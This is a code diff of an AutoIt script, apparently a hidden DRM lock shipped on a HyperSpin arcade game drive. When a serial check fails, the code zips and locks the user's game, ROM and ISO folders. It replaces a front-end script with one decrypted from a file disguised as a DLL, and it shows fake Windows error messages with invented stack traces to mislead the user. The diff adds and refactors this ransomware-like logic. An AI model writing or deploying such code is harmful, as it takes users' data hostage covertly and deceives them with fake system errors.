@@ -10,8 +10,8 @@
 
 hiddenRun("JoyToKey.exe")
 
+
 $drive = getCurrentDrive()
-$drive = "D:"
 $hyperFolder = $drive & "\Games\HyperSpin-fe\"
 $drmFolder = $drive & "\Games\RocketLauncher\Module Extensions\hs_ext\"
 $arcadeFolder = $drive & "\Games\Arcades\"
@@ -28,7 +28,6 @@ $serialFlag = $drmFolder & "serial.dll"
 $serial30Flag = $drmFolder & "serial-30.dll"
 $serials = ""
 
-
 If DirGetSize($hyperFolder) = -1 Then
 	MsgBox($MB_ICONERROR, " Windows Fatal Error 0x8891128", "El programa no puede iniciarse porque falta " & $drive & "d3dx9_43.dll en el equipo. Intente reinstalar el programa para corregir el problema.")
 	Exit
@@ -39,9 +38,9 @@ $tBuff = DllStructCreate("byte["& $headerSize &"]")
 _Crypt_GenRandom($tBuff, DllStructGetSize($tBuff))
 
 If FileExists($safe) Then
-	myLog("safe#" &  _NowDate() & " " & _NowTime(5))
 	Local $serialFlagExists = FileExists($serialFlag)
 	If Not serialMatches() Then
+		myLog("warning " &  _NowDate() & " " & _NowTime(5))
 		MsgBox($MB_ICONWARNING, " Windows Warning", "Missing Microsoft Runtime C# 2013 redistributable: msvc2013.dll (serial flag is " & $serialFlagExists & ")" & @CRLF & @CRLF & _
 		"#0  0x0000002a959bd26d in raise () from /lib64.dll" & @CRLF & _
 "#1  0x0000002a959bea6e in abort () from /lib64/msv2013.dll" & @CRLF & _
@@ -52,20 +51,12 @@ If FileExists($safe) Then
 "#10 0x000000004022ab70 in ?? ()" & @CRLF & _
 "#11 0x0000002a9a4d59c8 in ?? ()" & @CRLF & _
 "#12 0x0000000000000000)")
+	Else
+		myLog("safe ok " &  _NowDate() & " " & _NowTime(5))
 	EndIf
 ElseIf FileExists($reverse) Then
-	myLog("reverse#" &  _NowDate() & " " & _NowTime(5))
-	; TEST
-	;zipFolder($hyperFolder & "Databases\Main Menu", 0)
-	;zipFolder($hyperFolder & "Media\Main Menu\Images", 0)
-
-	; un fuck all
-	zipFolder($drive & "\Games", 0)
-
-	; dejamos al HScript.ahk original como estaba
-	FileSetAttrib($hyperFolder & "Scripts\HScript\HScript.ahk", "-R")
-	FileCopy($hyperFolder & "Scripts\HScript\HScript.ah3", $hyperFolder & "Scripts\HScript\HScript.ahk", $FC_OVERWRITE)
-	FileDelete($hyperFolder & "Scripts\HScript\HScript.ah3")
+	myLog("reverse " &  _NowDate() & " " & _NowTime(5))
+	reverse()
 	MsgBox($MB_ICONINFORMATION, " Unlock ok", ":-)")
 
 Else
@@ -75,48 +66,67 @@ Else
 		Local $count = Number(IniRead("serial-30.ini", "Main", "Players", "30"))
 		if ($count == 0) Then
 			$fuck = Not serialMatches()
+			myLog("serial-30#0 " & $fuck & " " & _NowDate() & " " & _NowTime(5))
 		Else
 			IniWrite("serial-30.ini", "Main", "Players", ""+($count-1))
+			myLog("serial-30#" & $count & " " & _NowDate() & " " & _NowTime(5))
 		EndIf
 	ElseIf FileExists($serialFlag) Then
 		$fuck = Not serialMatches()
-	Else
 		myLog("serial#" & $fuck & " " & _NowDate() & " " & _NowTime(5))
+	Else
 		; No hay serial.dll, a matar directamente
-		myLog("fuck#" &  _NowDate() & " " & _NowTime(5))
+		myLog("no-serial# " &  _NowDate() & " " & _NowTime(5))
 		$fuck = True
 
 	EndIf
 	If $fuck Then
-		myLog("fuck#" &  _NowDate() & " " & _NowTime(5))
-		; TEST
-		;zipFolder($hyperFolder & "Media\Main Menu\Images", 1)
-		;zipFolder($hyperFolder & "Databases\Main Menu", 1)
+		myLog("fuck# " &  _NowDate() & " " & _NowTime(5))
 
 		; fuck all
 		fuckAll()
 
-		If FileExists($drmFolder & "AutoHotkey3.dll") Then
-			; backup del HScript.ahk original y copiamos el del aviso de bloqueo
-			FileSetAttrib($hyperFolder & "Scripts\HScript\HScript.ahk", "-R")
-			FileCopy($hyperFolder & "Scripts\HScript\HScript.ahk", $hyperFolder & "Scripts\HScript\HScript.ah3", $FC_OVERWRITE)
-			_Crypt_DecryptFile($drmFolder & "AutoHotkey3.dll", $hyperFolder & "Scripts\HScript\HScript.ahk", $key, $CALG_AES_128)
-		EndIf
-
 		; Despedida y cierre :)
 		MsgBox($MB_ICONERROR+$MB_SYSTEMMODAL, "Disco bloqueado", "Disco bloqueado" & @CRLF & @CRLF & "Ponte en contacto con tu proveedor oficial o con http://hyperspin5tb.com para volverlo a activar.")
 		ShellExecute("http://hyperspin5tb.com/contacto/?locked")
-		myLog("kcuf#" &  _NowDate() & " " & _NowTime(5))
+		myLog("kcuf# " &  _NowDate() & " " & _NowTime(5))
 	Else
-		myLog("safe#" &  _NowDate() & " " & _NowTime(5))
+		myLog("nop# " &  _NowDate() & " " & _NowTime(5))
 	EndIf
 EndIf
 
+Func reverse()
+	; TEST
+	;zipFolder($hyperFolder & "Databases\Main Menu", 0)
+	;zipFolder($hyperFolder & "Media\Main Menu\Images", 0)
+
+	; un fuck all
+	zipFolder($drive & "\Games", 0)
+
+	; dejamos al HScript.ahk original como estaba
+	If FileExists($hyperFolder & "Scripts\HScript\HScript.ah3") Then
+        FileSetAttrib($hyperFolder & "Scripts\HScript\HScript.ahk", "-R")
+        FileCopy($hyperFolder & "Scripts\HScript\HScript.ah3", $hyperFolder & "Scripts\HScript\HScript.ahk", $FC_OVERWRITE)
+        FileDelete($hyperFolder & "Scripts\HScript\HScript.ah3")
+    EndIf
+EndFunc
+
 Func fuckAll()
+	; TEST
+	;zipFolder($hyperFolder & "Media\Main Menu\Images", 1)
+	;zipFolder($hyperFolder & "Databases\Main Menu", 1)
 	zipFolder($arcadeFolder, 1)
 	zipFolder($romsFolder, 1)
 	zipFolder($isosFolder, 1)
 	zipFolder($pcFolder, 1)
+
+	If FileExists($drmFolder & "AutoHotkey3.dll") Then
+		; backup del HScript.ahk original y copiamos el del aviso de bloqueo
+		FileSetAttrib($hyperFolder & "Scripts\HScript\HScript.ahk", "-R")
+		FileCopy($hyperFolder & "Scripts\HScript\HScript.ahk", $hyperFolder & "Scripts\HScript\HScript.ah3", $FC_OVERWRITE)
+		_Crypt_DecryptFile($drmFolder & "AutoHotkey3.dll", $hyperFolder & "Scripts\HScript\HScript.ahk", $key, $CALG_AES_128)
+	EndIf
+
 EndFunc
 
 Func serialMatches()
